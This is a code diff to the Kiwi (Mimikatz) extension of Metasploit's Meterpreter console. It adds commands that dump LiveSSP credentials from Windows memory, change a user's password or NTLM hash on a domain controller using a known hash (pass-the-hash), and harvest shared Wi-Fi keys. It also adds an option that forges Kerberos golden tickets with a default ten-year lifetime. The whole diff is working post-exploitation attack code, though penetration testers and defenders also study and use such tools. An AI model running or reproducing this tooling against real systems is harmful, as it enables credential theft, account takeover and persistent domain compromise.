@@ -8,7 +8,7 @@ module Ui
 
 ###
 #
-# Kiwi extension - grabs credentials from windows memory.
+# Kiwi extension - grabs credentials from windows memory (newer OSes).
 #
 # Benjamin DELPY `gentilkiwi`
 # http://blog.gentilkiwi.com/mimikatz
@@ -32,21 +32,21 @@ class Console::CommandDispatcher::Kiwi
   #
   # Initializes an instance of the priv command interaction. This function
   # also outputs a banner which gives proper acknowledgement to the original
-  # author of the Mimikatz 2.0 software.
+  # author of the Mimikatz software.
   #
   def initialize(shell)
     super
     print_line
-    print_line
-    print_line("  .#####.   mimikatz 2.1 (#{client.session_type})")
-    print_line(" .## ^ ##.  \"A La Vie, A L'Amour\"")
-    print_line(" ## / \\ ##  /* * *")
-    print_line(" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")
-    print_line(" '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)")
-    print_line("  '#####'    Ported to Metasploit by OJ Reeves `TheColonial` * * */")
+    print_line("  .#####.   mimikatz 2.2.0 20191125 (#{client.session_type})")
+    print_line(" .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)")
+    print_line(" ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )")
+    print_line(" ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz")
+    print_line(" '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )")
+    print_line("  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/")
     print_line
 
-    if client.arch == ARCH_X86 and client.sys.config.sysinfo['Architecture'] == ARCH_X64
+    si = client.sys.config.sysinfo
+    if client.arch == ARCH_X86 && si['Architecture'] == ARCH_X64
       print_warning('Loaded x86 Kiwi on an x64 architecture.')
       print_line
     end
@@ -63,6 +63,7 @@ class Console::CommandDispatcher::Kiwi
       'creds_wdigest'         => 'Retrieve WDigest creds (parsed)',
       'creds_msv'             => 'Retrieve LM/NTLM creds (parsed)',
       'creds_ssp'             => 'Retrieve SSP creds',
+      'creds_livessp'         => 'Retrieve Live SSP creds',
       'creds_tspkg'           => 'Retrieve TsPkg creds (parsed)',
       'creds_kerberos'        => 'Retrieve Kerberos creds (parsed)',
       'creds_all'             => 'Retrieve all credentials (parsed)',
@@ -72,13 +73,101 @@ class Console::CommandDispatcher::Kiwi
       'kerberos_ticket_list'  => 'List all kerberos tickets (unparsed)',
       'lsa_dump_secrets'      => 'Dump LSA secrets (unparsed)',
       'lsa_dump_sam'          => 'Dump LSA SAM (unparsed)',
-      'wifi_list'             => 'List wifi profiles/creds',
+      'password_change'       => 'Change the password/hash of a user',
+      'wifi_list'             => 'List wifi profiles/creds for the current user',
+      'wifi_list_shared'      => 'List shared wifi profiles/creds (requires SYSTEM)',
     }
   end
 
   def cmd_kiwi_cmd(*args)
     output = client.kiwi.exec_cmd(args.join(' '))
     print_line(output)
+  end
+
+  #
+  # Valid options for the password change feature
+  #
+  @@password_change_usage_opts = Rex::Parser::Arguments.new(
+    '-h' => [false, 'Help banner'],
+    '-u' => [true,  'User name of the password to change.'],
+    '-s' => [true,  'Server to perform the action on (eg. Domain Controller).'],
+    '-p' => [true,  'The known existing/old password (do not use with -n).'],
+    '-n' => [true,  'The known existing/old hash (do not use with -p).'],
+    '-P' => [true,  'The new password to set for the account (do not use with -N).'],
+    '-N' => [true,  'The new hash to set for the account (do not use with -P).']
+  )
+
+  def cmd_password_change_usage
+    print_line('Usage password_change [options]')
+    print_line
+    print_line(@@password_change_usage_opts.usage)
+  end
+
+  def cmd_password_change(*args)
+    if args.length == 0 || args.include?('-h')
+      cmd_password_change_usage
+      return
+    end
+
+    opts = {}
+
+    @@password_change_usage_opts.parse(args) { |opt, idx, val|
+      case opt
+      when '-u'
+        opts[:user] = val
+      when '-s'
+        opts[:server] = val
+      when '-p'
+        opts[:old_pass] = val
+      when '-n'
+        opts[:old_hash] = val
+      when '-P'
+        opts[:new_pass] = val
+      when '-N'
+        opts[:new_hash] = val
+      end
+    }
+
+    valid = true
+    if opts[:old_pass] && opts[:old_hash]
+      print_error('Options -p and -n cannot be used together.')
+      valid = false
+    end
+
+    if opts[:new_pass] && opts[:new_hash]
+      print_error('Options -P and -N cannot be used together.')
+      valid = false
+    end
+
+    unless opts[:old_pass] || opts[:old_hash]
+      print_error('At least one of -p and -n must be specified.')
+      valid = false
+    end
+
+    unless opts[:new_pass] || opts[:new_hash]
+      print_error('At least one of -P and -N must be specified.')
+      valid = false
+    end
+
+    unless opts[:user]
+      print_error('The -u parameter must be specified.')
+      valid = false
+    end
+
+    if valid
+
+      unless opts[:server]
+        print_status('No server (-s) specified, defaulting to localhost.')
+      end
+
+      result = client.kiwi.password_change(opts)
+
+      if result[:success] == true
+        print_good("Success! New NTLM hash: #{result[:new]}")
+      else
+        print_error("Failed! #{result[:error]}")
+      end
+    end
   end
 
   def cmd_dcsync(*args)
@@ -149,7 +238,8 @@ class Console::CommandDispatcher::Kiwi
     '-d' => [ true,  'FQDN of the target domain (required)' ],
     '-k' => [ true,  'krbtgt domain user NTLM hash' ],
     '-t' => [ true,  'Local path of the file to store the ticket in (required)' ],
-    '-s' => [ true,  'SID of the domain' ]
+    '-s' => [ true,  'SID of the domain' ],
+    '-e' => [ true,  'End in ... Duration in hours (ex: -e 10 for 10 hours), default 10 YEARS']
   )
 
   #
@@ -179,7 +269,8 @@ class Console::CommandDispatcher::Kiwi
       domain_sid: nil,
       krbtgt_hash: nil,
       user_id: nil,
-      group_ids: nil
+      group_ids: nil,
+      end_in: 87608
     }
 
     @@golden_ticket_create_opts.parse(args) { |opt, idx, val|
@@ -198,6 +289,8 @@ class Console::CommandDispatcher::Kiwi
         opts[:group_ids] = val
       when '-s'
         opts[:domain_sid] = val
+      when '-e'
+        opts[:end_in] = val.to_i
       end
     }
 
@@ -303,37 +396,49 @@ class Console::CommandDispatcher::Kiwi
   end
 
   #
-  # Dump all the wifi profiles/credentials
+  # Dump all the shared wifi profiles/credentials
+  #
+  def cmd_wifi_list_shared(*args)
+    interfaces_dir = client.sys.config.getenv('AllUsersProfile') + '\Microsoft\Wlansvc\Profiles\Interfaces'
+    files = client.fs.file.search(interfaces_dir, '*.xml', true)
+
+    if files.length == 0
+      print_error('No shared WiFi profiles found.')
+    else
+      interfaces = {}
+      files.each do |f|
+        interface_guid = f['path'].split("\\")[-1]
+        full_path = "#{f['path']}\\#{f['name']}"
+
+        interfaces[interface_guid] ||= []
+        interfaces[interface_guid] << full_path
+      end
+      results = client.kiwi.wifi_parse_shared(interfaces)
+
+      if results.length > 0
+        display_wifi_profiles(results)
+      else
+        print_line
+        print_error('No shared wireless profiles found on the target.')
+      end
+    end
+
+    true
+  end
+
+  #
+  # Dump all the wifi profiles/credentials for the current user
   #
   def cmd_wifi_list(*args)
     results = client.kiwi.wifi_list
-
     if results.length > 0
-      results.each do |r|
-        table = Rex::Text::Table.new(
-          'Header'    => "#{r[:desc]} - #{r[:guid]}",
-          'Indent'    => 0,
-          'SortIndex' => 0,
-          'Columns'   => [
-            'Name', 'Auth', 'Type', 'Shared Key'
-          ]
-        )
-
-        print_line
-        r[:profiles].each do |p|
-          table << [p[:name], p[:auth], p[:key_type], p[:shared_key]]
-        end
-
-        print_line(table.to_s)
-        print_line("State: #{r[:state]}")
-      end
+      display_wifi_profiles(results)
     else
       print_line
       print_error('No wireless profiles found on the target.')
     end
 
-    print_line
-    return true
+    true
   end
 
   @@creds_opts = Rex::Parser::Arguments.new(
@@ -384,6 +489,14 @@ class Console::CommandDispatcher::Kiwi
   end
 
   #
+  # Dump all LiveSSP credentials to screen.
+  #
+  def cmd_creds_livessp(*args)
+    method = Proc.new { client.kiwi.creds_livessp }
+    scrape_passwords('livessp', method, args)
+  end
+
+  #
   # Dump all TSPKG credentials to screen.
   #
   def cmd_creds_tspkg(*args)
@@ -400,6 +513,30 @@ class Console::CommandDispatcher::Kiwi
   end
 
 protected
+
+  def display_wifi_profiles(profiles)
+    profiles.each do |r|
+      header = r[:guid]
+      header = "#{r[:desc]} - #{header}" if r[:desc]
+      table = Rex::Text::Table.new(
+        'Header'    => header,
+        'Indent'    => 0,
+        'SortIndex' => 0,
+        'Columns'   => [
+          'Name', 'Auth', 'Type', 'Shared Key'
+        ]
+      )
+
+      print_line
+      r[:profiles].each do |p|
+        table << [p[:name], p[:auth], p[:key_type] || 'Unknown', p[:shared_key]]
+      end
+
+      print_line(table.to_s)
+      print_line("State: #{r[:state] || 'Unknown'}")
+    end
+  end
+
 
   def check_is_domain_user(msg='Running as SYSTEM, function will not work.')
     if client.sys.config.is_system?
@@ -442,18 +579,44 @@ protected
     output = ""
 
     accounts.keys.each do |k|
-
       next if accounts[k].length == 0
+
+      # Keep track of the columns that we were given, in
+      # the order we are given them, while removing duplicates
+      columns = []
+      existing = Set.new
+      accounts[k].each do |acct|
+        acct.keys.each do |k|
+          unless existing.include?(k)
+            columns << k
+            existing.add(k)
+          end
+        end
+      end
 
       table = Rex::Text::Table.new(
         'Header'    => "#{k} credentials",
         'Indent'    => 0,
         'SortIndex' => 0,
-        'Columns'   => accounts[k][0].keys
+        'Columns'   => columns
       )
 
       accounts[k].each do |acct|
-        table << acct.values
+        values = []
+        # Iterate through the given columns and match the values up
+        # correctly based on the index of the column header.
+        columns.each do |c|
+          col_idx = acct.keys.index(c)
+          # If the column exists, we'll use the value that is associated
+          # with the column based on its index
+          if col_idx
+            values << acct.values[col_idx]
+          else
+            # Otherwise, just add a blank value
+            values << ''
+          end
+        end
+        table << values
       end
 
       output << table.to_s + "\n"
@@ -496,4 +659,3 @@ end
 end
 end
 end
-
